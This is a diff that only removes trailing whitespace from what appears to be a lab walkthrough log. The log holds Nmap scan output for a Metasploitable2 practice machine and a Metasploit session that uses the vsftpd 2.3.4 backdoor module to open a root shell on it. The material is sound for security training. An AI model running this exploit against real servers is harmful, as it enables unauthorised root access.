@@ -15,7 +15,7 @@ PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 23/tcp   open  telnet      Linux telnetd
@@ -26,13 +26,13 @@ PORT     STATE SERVICE     VERSION
 |_Not valid after:  2010-04-16T14:07:45+00:00
 |_ssl-date: 2014-05-07T20:48:06+00:00; -6d18h41m54s from local time.
 53/tcp   open  domain      ISC BIND 9.4.2
-| dns-nsid: 
+| dns-nsid:
 |_  bind.version: 9.4.2
 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
 |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
 |_http-title: Metasploitable2 - Linux
 111/tcp  open  rpcbind     2 (RPC #100000)
-| rpcinfo: 
+| rpcinfo:
 |   program version   port/proto  service
 |   100000  2            111/tcp  rpcbind
 |   100000  2            111/udp  rpcbind
@@ -59,15 +59,15 @@ PORT     STATE SERVICE     VERSION
 |_mysql-info: ERROR: Script execution failed (use -d to debug)
 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
 5900/tcp open  vnc         VNC (protocol 3.3)
-| vnc-info: 
+| vnc-info:
 |   Protocol version: 3.3
-|   Security types: 
+|   Security types:
 |_    Unknown security type (33554432)
 6000/tcp open  X11         (access denied)
 6667/tcp open  irc         Unreal ircd
-| irc-info: 
+| irc-info:
 |   server: irc.Metasploitable.LAN
-|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
 |   servers: 1
 |   users: 1
 |   lservers: 0
@@ -91,9 +91,9 @@ Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.
 
 Host script results:
 |_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Unix (Samba 3.0.20-Debian)
-|   NetBIOS computer name: 
+|   NetBIOS computer name:
 |   Workgroup: WORKGROUP
 |_  System time: 2014-05-07T16:47:56-04:00
 
@@ -117,7 +117,7 @@ Matching Modules
    exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
 
 
-msf > use exploit/unix/ftp/vsftpd_234_backdoor 
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
 
 msf exploit(vsftpd_234_backdoor) > show options
 
@@ -163,7 +163,7 @@ msf exploit(vsftpd_234_backdoor) > exploit -z
 [*] Found shell.
 [*] Command shell session 5 opened (192.168.195.1:44986 -> 192.168.195.135:6200) at 2014-05-14 22:26:11 +0600
 [*] Session 5 created in the background.
-msf exploit(vsftpd_234_backdoor) > sessions -l 
+msf exploit(vsftpd_234_backdoor) > sessions -l
 
 Active sessions
 ===============
@@ -175,10 +175,5 @@ Active sessions
 msf exploit(vsftpd_234_backdoor) > sessions -i 5
 [*] Starting interaction with 5...
 
-whoami 
+whoami
 root
-
-
-
-
-
